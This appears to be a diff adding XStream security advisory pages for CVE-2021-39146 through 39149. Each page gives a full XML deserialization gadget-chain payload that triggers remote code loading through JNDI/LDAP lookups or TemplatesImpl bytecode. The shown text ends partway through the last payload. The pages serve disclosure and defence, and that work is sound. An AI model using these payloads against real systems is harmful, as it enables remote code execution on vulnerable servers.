          "10:  Created on 26. May 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39146</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39146: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box.  No user is",
          "24:     affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security framework",
          "25:     </a> with a whitelist limited to the minimal required    types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:     <p>Create a simple TreeSet and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:     unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;sorted-set&gt;",
          "38:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "39:     &lt;type&gt;test&lt;/type&gt;",
          "40:     &lt;value class='javax.swing.MultiUIDefaults' serialization='custom'&gt;",
          "41:       &lt;unserializable-parents/&gt;",
          "42:       &lt;hashtable&gt;",
          "43:           &lt;default&gt;",
          "44:             &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;",
          "45:             &lt;threshold&gt;525&lt;/threshold&gt;",
          "46:           &lt;/default&gt;",
          "47:           &lt;int&gt;700&lt;/int&gt;",
          "48:           &lt;int&gt;0&lt;/int&gt;",
          "49:       &lt;/hashtable&gt;",
          "50:       &lt;javax.swing.UIDefaults&gt;",
          "51:           &lt;default&gt;",
          "52:             &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt;",
          "53:             &lt;resourceCache/&gt;",
          "54:           &lt;/default&gt;",
          "55:       &lt;/javax.swing.UIDefaults&gt;",
          "56:       &lt;javax.swing.MultiUIDefaults&gt;",
          "57:           &lt;default&gt;",
          "58:             &lt;tables&gt;",
          "59:             &lt;javax.swing.UIDefaults serialization='custom'&gt;",
          "60:               &lt;unserializable-parents/&gt;",
          "61:               &lt;hashtable&gt;",
          "62:                 &lt;default&gt;",
          "63:                   &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;",
          "64:                   &lt;threshold&gt;525&lt;/threshold&gt;",
          "65:                 &lt;/default&gt;",
          "66:                 &lt;int&gt;700&lt;/int&gt;",
          "67:                 &lt;int&gt;1&lt;/int&gt;",
          "68:                 &lt;string&gt;lazyValue&lt;/string&gt;",
          "69:                 &lt;javax.swing.UIDefaults_-ProxyLazyValue&gt;",
          "70:                   &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;",
          "71:                   &lt;methodName&gt;doLookup&lt;/methodName&gt;",
          "72:                   &lt;args&gt;",
          "73:                     &lt;string&gt;ldap://127.0.0.1:1389/#evil&lt;/string&gt;",
          "74:                   &lt;/args&gt;",
          "75:                 &lt;/javax.swing.UIDefaults_-ProxyLazyValue&gt;",
          "76:               &lt;/hashtable&gt;",
          "77:               &lt;javax.swing.UIDefaults&gt;",
          "78:                 &lt;default&gt;",
          "79:                   &lt;defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/&gt;",
          "80:                   &lt;resourceCache/&gt;",
          "81:                 &lt;/default&gt;",
          "82:               &lt;/javax.swing.UIDefaults&gt;",
          "83:             &lt;/javax.swing.UIDefaults&gt;",
          "84:             &lt;/tables&gt;",
          "85:           &lt;/default&gt;",
          "86:       &lt;/javax.swing.MultiUIDefaults&gt;",
          "87:     &lt;/value&gt;",
          "88:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "89:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "90:     &lt;type&gt;test&lt;/type&gt;",
          "91:     &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
          "92:       &lt;m__obj class='string'&gt;test&lt;/m__obj&gt;",
          "93:     &lt;/value&gt;",
          "94:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "95: &lt;/sorted-set&gt;",
          "96: </pre></div>",
          "97: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "98: xstream.fromXML(xml);",
          "99: </pre></div>",
          "101:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled.</p>",
          "103:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "105:     <h2 id=\"impact\">Impact</h2>",
          "107:     <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "108:     input stream.</p>",
          "110:     <h2 id=\"workarounds\">Workarounds</h2>",
          "112:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "114:     <h2 id=\"credits\">Credits</h2>",
          "116:     <p>Ceclin and YXXX, White Hat Hacker from Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "118:       </body>",
          "119:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39147.html||xstream-distribution/src/content/CVE-2021-39147.html": [
          "File: xstream-distribution/src/content/CVE-2021-39147.html -> xstream-distribution/src/content/CVE-2021-39147.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 28. May 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39147</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39147: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box.  No user is",
          "24:     affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security framework",
          "25:     </a> with a whitelist limited to the minimal required    types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:     <p>Create a simple TreeSet and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:     unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;sorted-set&gt;",
          "38:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "39:     &lt;type&gt;ysomap&lt;/type&gt;",
          "40:     &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;",
          "41:       &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;",
          "42:         &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;",
          "43:         &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;",
          "44:         &lt;bodyParts/&gt;",
          "45:         &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
          "46:           &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;",
          "47:           &lt;multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'&gt;",
          "48:             &lt;soapPart/&gt;",
          "49:             &lt;mm&gt;",
          "50:               &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;",
          "51:                 &lt;aliases class='com.sun.jndi.ldap.LdapSearchEnumeration'&gt;",
          "52:                   &lt;listArg class='javax.naming.CompoundName' serialization='custom'&gt;",
          "53:                     &lt;javax.naming.CompoundName&gt;",
          "54:                       &lt;properties/&gt;",
          "55:                       &lt;int&gt;1&lt;/int&gt;",
          "56:                       &lt;string&gt;ysomap&lt;/string&gt;",
          "57:                     &lt;/javax.naming.CompoundName&gt;",
          "58:                   &lt;/listArg&gt;",
          "59:                   &lt;cleaned&gt;false&lt;/cleaned&gt;",
          "60:                   &lt;res&gt;",
          "61:                     &lt;msgId&gt;0&lt;/msgId&gt;",
          "62:                     &lt;status&gt;0&lt;/status&gt;",
          "63:                   &lt;/res&gt;",
          "64:                   &lt;enumClnt&gt;",
          "65:                     &lt;isLdapv3&gt;false&lt;/isLdapv3&gt;",
          "66:                     &lt;referenceCount&gt;0&lt;/referenceCount&gt;",
          "67:                     &lt;pooled&gt;false&lt;/pooled&gt;",
          "68:                     &lt;authenticateCalled&gt;false&lt;/authenticateCalled&gt;",
          "69:                   &lt;/enumClnt&gt;",
          "70:                   &lt;limit&gt;1&lt;/limit&gt;",
          "71:                   &lt;posn&gt;0&lt;/posn&gt;",
          "72:                   &lt;homeCtx&gt;",
          "73:                     &lt;__contextType&gt;0&lt;/__contextType&gt;",
          "74:                     &lt;port__number&gt;1099&lt;/port__number&gt;",
          "75:                     &lt;hostname&gt;127.0.0.1&lt;/hostname&gt;",
          "76:                     &lt;clnt reference='../../enumClnt'/&gt;",
          "77:                     &lt;handleReferrals&gt;0&lt;/handleReferrals&gt;",
          "78:                     &lt;hasLdapsScheme&gt;true&lt;/hasLdapsScheme&gt;",
          "79:                     &lt;netscapeSchemaBug&gt;false&lt;/netscapeSchemaBug&gt;",
          "80:                     &lt;referralHopLimit&gt;0&lt;/referralHopLimit&gt;",
          "81:                     &lt;batchSize&gt;0&lt;/batchSize&gt;",
          "82:                     &lt;deleteRDN&gt;false&lt;/deleteRDN&gt;",
          "83:                     &lt;typesOnly&gt;false&lt;/typesOnly&gt;",
          "84:                     &lt;derefAliases&gt;0&lt;/derefAliases&gt;",
          "85:                     &lt;addrEncodingSeparator/&gt;",
          "86:                     &lt;connectTimeout&gt;0&lt;/connectTimeout&gt;",
          "87:                     &lt;readTimeout&gt;0&lt;/readTimeout&gt;",
          "88:                     &lt;waitForReply&gt;false&lt;/waitForReply&gt;",
          "89:                     &lt;replyQueueSize&gt;0&lt;/replyQueueSize&gt;",
          "90:                     &lt;useSsl&gt;false&lt;/useSsl&gt;",
          "91:                     &lt;useDefaultPortNumber&gt;false&lt;/useDefaultPortNumber&gt;",
          "92:                     &lt;parentIsLdapCtx&gt;false&lt;/parentIsLdapCtx&gt;",
          "93:                     &lt;hopCount&gt;0&lt;/hopCount&gt;",
          "94:                     &lt;unsolicited&gt;false&lt;/unsolicited&gt;",
          "95:                     &lt;sharable&gt;false&lt;/sharable&gt;",
          "96:                     &lt;enumCount&gt;1&lt;/enumCount&gt;",
          "97:                     &lt;closeRequested&gt;false&lt;/closeRequested&gt;",
          "98:                   &lt;/homeCtx&gt;",
          "99:                   &lt;more&gt;true&lt;/more&gt;",
          "100:                   &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;",
          "101:                   &lt;startName class='javax.naming.ldap.LdapName' serialization='custom'&gt;",
          "102:                     &lt;javax.naming.ldap.LdapName&gt;",
          "103:                       &lt;default/&gt;",
          "104:                       &lt;string&gt;uid=ysomap,ou=oa,dc=example,dc=com&lt;/string&gt;",
          "105:                     &lt;/javax.naming.ldap.LdapName&gt;",
          "106:                   &lt;/startName&gt;",
          "107:                   &lt;searchArgs&gt;",
          "108:                     &lt;name class='javax.naming.CompoundName' reference='../../listArg'/&gt;",
          "109:                     &lt;filter&gt;ysomap&lt;/filter&gt;",
          "110:                     &lt;cons&gt;",
          "111:                       &lt;searchScope&gt;1&lt;/searchScope&gt;",
          "112:                       &lt;timeLimit&gt;0&lt;/timeLimit&gt;",
          "113:                       &lt;derefLink&gt;false&lt;/derefLink&gt;",
          "114:                       &lt;returnObj&gt;true&lt;/returnObj&gt;",
          "115:                       &lt;countLimit&gt;0&lt;/countLimit&gt;",
          "116:                     &lt;/cons&gt;",
          "117:                     &lt;reqAttrs/&gt;",
          "118:                   &lt;/searchArgs&gt;",
          "119:                   &lt;entries&gt;",
          "120:                     &lt;com.sun.jndi.ldap.LdapEntry&gt;",
          "121:                       &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;",
          "122:                       &lt;attributes class='javax.naming.directory.BasicAttributes' serialization='custom'&gt;",
          "123:                         &lt;default&gt;",
          "124:                           &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;",
          "125:                         &lt;/default&gt;",
          "126:                         &lt;int&gt;4&lt;/int&gt;",
          "127:                         &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;",
          "128:                           &lt;javax.naming.directory.BasicAttribute&gt;",
          "129:                             &lt;default&gt;",
          "130:                               &lt;ordered&gt;false&lt;/ordered&gt;",
          "131:                               &lt;attrID&gt;objectClass&lt;/attrID&gt;",
          "132:                             &lt;/default&gt;",
          "133:                             &lt;int&gt;1&lt;/int&gt;",
          "134:                             &lt;string&gt;javaNamingReference&lt;/string&gt;",
          "135:                           &lt;/javax.naming.directory.BasicAttribute&gt;",
          "136:                           &lt;com.sun.jndi.ldap.LdapAttribute&gt;",
          "137:                             &lt;default&gt;",
          "138:                               &lt;rdn class=''javax.naming.CompositeName'' serialization=''custom''&gt;",
          "139:                                 &lt;javax.naming.CompositeName&gt;",
          "140:                                   &lt;int&gt;0&lt;/int&gt;",
          "141:                                 &lt;/javax.naming.CompositeName&gt;",
          "142:                               &lt;/rdn&gt;",
          "143:                             &lt;/default&gt;",
          "144:                           &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "145:                         &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "146:                         &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;",
          "147:                           &lt;javax.naming.directory.BasicAttribute&gt;",
          "148:                             &lt;default&gt;",
          "149:                               &lt;ordered&gt;false&lt;/ordered&gt;",
          "150:                               &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;",
          "151:                             &lt;/default&gt;",
          "152:                             &lt;int&gt;1&lt;/int&gt;",
          "153:                             &lt;string&gt;http://127.0.0.1/&lt;/string&gt;",
          "154:                           &lt;/javax.naming.directory.BasicAttribute&gt;",
          "155:                           &lt;com.sun.jndi.ldap.LdapAttribute&gt;",
          "156:                             &lt;default&gt;",
          "157:                               &lt;rdn class=''javax.naming.CompositeName'' serialization=''custom''&gt;",
          "158:                                 &lt;javax.naming.CompositeName&gt;",
          "159:                                   &lt;int&gt;0&lt;/int&gt;",
          "160:                                 &lt;/javax.naming.CompositeName&gt;",
          "161:                               &lt;/rdn&gt;",
          "162:                             &lt;/default&gt;",
          "163:                           &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "164:                         &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "165:                         &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;",
          "166:                           &lt;javax.naming.directory.BasicAttribute&gt;",
          "167:                             &lt;default&gt;",
          "168:                               &lt;ordered&gt;false&lt;/ordered&gt;",
          "169:                               &lt;attrID&gt;javaClassName&lt;/attrID&gt;",
          "170:                             &lt;/default&gt;",
          "171:                             &lt;int&gt;1&lt;/int&gt;",
          "172:                             &lt;string&gt;foo&lt;/string&gt;",
          "173:                           &lt;/javax.naming.directory.BasicAttribute&gt;",
          "174:                           &lt;com.sun.jndi.ldap.LdapAttribute&gt;",
          "175:                             &lt;default&gt;",
          "176:                               &lt;rdn class=''javax.naming.CompositeName'' serialization=''custom''&gt;",
          "177:                                 &lt;javax.naming.CompositeName&gt;",
          "178:                                   &lt;int&gt;0&lt;/int&gt;",
          "179:                                 &lt;/javax.naming.CompositeName&gt;",
          "180:                               &lt;/rdn&gt;",
          "181:                             &lt;/default&gt;",
          "182:                           &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "183:                         &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "184:                         &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;",
          "185:                           &lt;javax.naming.directory.BasicAttribute&gt;",
          "186:                             &lt;default&gt;",
          "187:                               &lt;ordered&gt;false&lt;/ordered&gt;",
          "188:                               &lt;attrID&gt;javaFactory&lt;/attrID&gt;",
          "189:                             &lt;/default&gt;",
          "190:                             &lt;int&gt;1&lt;/int&gt;",
          "191:                             &lt;string&gt;EvilObj&lt;/string&gt;",
          "192:                           &lt;/javax.naming.directory.BasicAttribute&gt;",
          "193:                           &lt;com.sun.jndi.ldap.LdapAttribute&gt;",
          "194:                             &lt;default&gt;",
          "195:                               &lt;rdn class=''javax.naming.CompositeName'' serialization=''custom''&gt;",
          "196:                                 &lt;javax.naming.CompositeName&gt;",
          "197:                                   &lt;int&gt;0&lt;/int&gt;",
          "198:                                 &lt;/javax.naming.CompositeName&gt;",
          "199:                               &lt;/rdn&gt;",
          "200:                             &lt;/default&gt;",
          "201:                           &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "202:                         &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "203:                       &lt;/attributes&gt;",
          "204:                     &lt;/com.sun.jndi.ldap.LdapEntry&gt;",
          "205:                   &lt;/entries&gt;",
          "206:                 &lt;/aliases&gt;",
          "207:               &lt;/it&gt;",
          "208:             &lt;/mm&gt;",
          "209:           &lt;/multiPart&gt;",
          "210:         &lt;/sm&gt;",
          "211:       &lt;/message&gt;",
          "212:     &lt;/value&gt;",
          "213:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "214:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "215:     &lt;type&gt;ysomap&lt;/type&gt;",
          "216:     &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
          "217:       &lt;m__obj class='string'&gt;test&lt;/m__obj&gt;",
          "218:     &lt;/value&gt;",
          "219:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "220: &lt;/sorted-set&gt;",
          "221: </pre></div>",
          "222: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "223: xstream.fromXML(xml);",
          "224: </pre></div>",
          "226:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled.</p>",
          "228:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "230:     <h2 id=\"impact\">Impact</h2>",
          "232:     <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "233:     input stream.</p>",
          "235:     <h2 id=\"workarounds\">Workarounds</h2>",
          "237:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "239:     <h2 id=\"credits\">Credits</h2>",
          "241:     <p>wh1t3p1g G5-RD6@IIE found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "243:       </body>",
          "244:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39148.html||xstream-distribution/src/content/CVE-2021-39148.html": [
          "File: xstream-distribution/src/content/CVE-2021-39148.html -> xstream-distribution/src/content/CVE-2021-39148.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 28. May 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39148</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39148: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box.  No user is",
          "24:     affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security framework",
          "25:     </a> with a whitelist limited to the minimal required    types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:     <p>Create a simple TreeSet and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:     unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;sorted-set&gt;",
          "38:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "39:     &lt;type&gt;ysomap&lt;/type&gt;",
          "40:     &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;",
          "41:       &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;",
          "42:         &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;",
          "43:         &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;",
          "44:         &lt;bodyParts/&gt;",
          "45:         &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
          "46:           &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;",
          "47:           &lt;multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'&gt;",
          "48:             &lt;soapPart/&gt;",
          "49:             &lt;mm&gt;",
          "50:               &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;",
          "51:                 &lt;aliases class='com.sun.jndi.toolkit.dir.ContextEnumerator'&gt;",
          "52:                   &lt;children class='javax.naming.directory.BasicAttribute$ValuesEnumImpl'&gt;",
          "53:                     &lt;list class='com.sun.xml.internal.dtdparser.SimpleHashtable'&gt;",
          "54:                       &lt;current&gt;",
          "55:                         &lt;hash&gt;1&lt;/hash&gt;",
          "56:                         &lt;key class='javax.naming.Binding'&gt;",
          "57:                           &lt;name&gt;ysomap&lt;/name&gt;",
          "58:                           &lt;isRel&gt;false&lt;/isRel&gt;",
          "59:                             &lt;boundObj class='com.sun.jndi.ldap.LdapReferralContext'&gt;",
          "60:                               &lt;refCtx class='javax.naming.spi.ContinuationDirContext'&gt;",
          "61:                                 &lt;cpe&gt;",
          "62:                                   &lt;stackTrace/&gt;",
          "63:                                   &lt;suppressedExceptions class='java.util.Collections$UnmodifiableRandomAccessList' resolves-to='java.util.Collections$UnmodifiableList'&gt;",
          "64:                                     &lt;c class='list'/&gt;",
          "65:                                     &lt;list reference='../c'/&gt;",
          "66:                                   &lt;/suppressedExceptions&gt;",
          "67:                                   &lt;resolvedObj class='javax.naming.Reference'&gt;",
          "68:                                     &lt;className&gt;EvilObj&lt;/className&gt;",
          "69:                                     &lt;addrs/&gt;",
          "70:                                     &lt;classFactory&gt;EvilObj&lt;/classFactory&gt;",
          "71:                                     &lt;classFactoryLocation&gt;http://127.0.0.1:1099/&lt;/classFactoryLocation&gt;",
          "72:                                   &lt;/resolvedObj&gt;",
          "73:                                   &lt;altName class='javax.naming.CompoundName' serialization='custom'&gt;",
          "74:                                     &lt;javax.naming.CompoundName&gt;",
          "75:                                       &lt;properties/&gt;",
          "76:                                       &lt;int&gt;1&lt;/int&gt;",
          "77:                                       &lt;string&gt;ysomap&lt;/string&gt;",
          "78:                                     &lt;/javax.naming.CompoundName&gt;",
          "79:                                   &lt;/altName&gt;",
          "80:                                 &lt;/cpe&gt;",
          "81:                               &lt;/refCtx&gt;",
          "82:                               &lt;skipThisReferral&gt;false&lt;/skipThisReferral&gt;",
          "83:                               &lt;hopCount&gt;0&lt;/hopCount&gt;",
          "84:                             &lt;/boundObj&gt;",
          "85:                         &lt;/key&gt;",
          "86:                       &lt;/current&gt;",
          "87:                       &lt;currentBucket&gt;0&lt;/currentBucket&gt;",
          "88:                       &lt;count&gt;0&lt;/count&gt;",
          "89:                       &lt;threshold&gt;0&lt;/threshold&gt;",
          "90:                     &lt;/list&gt;",
          "91:                   &lt;/children&gt;",
          "92:                   &lt;currentReturned&gt;true&lt;/currentReturned&gt;",
          "93:                   &lt;currentChildExpanded&gt;false&lt;/currentChildExpanded&gt;",
          "94:                   &lt;rootProcessed&gt;true&lt;/rootProcessed&gt;",
          "95:                   &lt;scope&gt;2&lt;/scope&gt;",
          "96:                 &lt;/aliases&gt;",
          "97:               &lt;/it&gt;",
          "98:             &lt;/mm&gt;",
          "99:           &lt;/multiPart&gt;",
          "100:         &lt;/sm&gt;",
          "101:       &lt;/message&gt;",
          "102:     &lt;/value&gt;",
          "103:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "104:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "105:     &lt;type&gt;ysomap&lt;/type&gt;",
          "106:     &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
          "107:       &lt;m__obj class='string'&gt;test&lt;/m__obj&gt;",
          "108:     &lt;/value&gt;",
          "109:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "110: &lt;/sorted-set&gt;",
          "111: </pre></div>",
          "112: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "113: xstream.fromXML(xml);",
          "114: </pre></div>",
          "116:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled.</p>",
          "118:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "120:     <h2 id=\"impact\">Impact</h2>",
          "122:     <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "123:     input stream.</p>",
          "125:     <h2 id=\"workarounds\">Workarounds</h2>",
          "127:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "129:     <h2 id=\"credits\">Credits</h2>",
          "131:     <p>wh1t3p1g G5-RD6@IIE found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "133:       </body>",
          "134:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39149.html||xstream-distribution/src/content/CVE-2021-39149.html": [
          "File: xstream-distribution/src/content/CVE-2021-39149.html -> xstream-distribution/src/content/CVE-2021-39149.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 26. June 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39149</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39149: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box. No user is",
          "24:     affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:     framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:     <p>Create a simple LinkedHashSet and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:     unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;linked-hash-set&gt;",
          "38:   &lt;dynamic-proxy&gt;",
          "39:     &lt;interface&gt;map&lt;/interface&gt;",
          "40:     &lt;handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'&gt;",
          "41:    &lt;classToInvocationHandler class='linked-hash-map'/&gt;",
          "42:       &lt;defaultHandler class='sun.tracing.NullProvider'&gt;",
          "43:         &lt;active&gt;true&lt;/active&gt;",
          "44:         &lt;providerType&gt;java.lang.Object&lt;/providerType&gt;",
          "45:         &lt;probes&gt;",
          "46:           &lt;entry&gt;",
          "47:             &lt;method&gt;",
          "48:               &lt;class&gt;java.lang.Object&lt;/class&gt;",
          "49:               &lt;name&gt;hashCode&lt;/name&gt;",
          "50:               &lt;parameter-types/&gt;",
          "51:             &lt;/method&gt;",
          "52:             &lt;sun.tracing.dtrace.DTraceProbe&gt;",
          "53:               &lt;proxy class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'/&gt;",
          "54:                 &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;",
          "55:                   &lt;default&gt;",
          "56:                     &lt;__name&gt;Pwnr&lt;/__name&gt;",
          "57:                     &lt;__bytecodes&gt;",
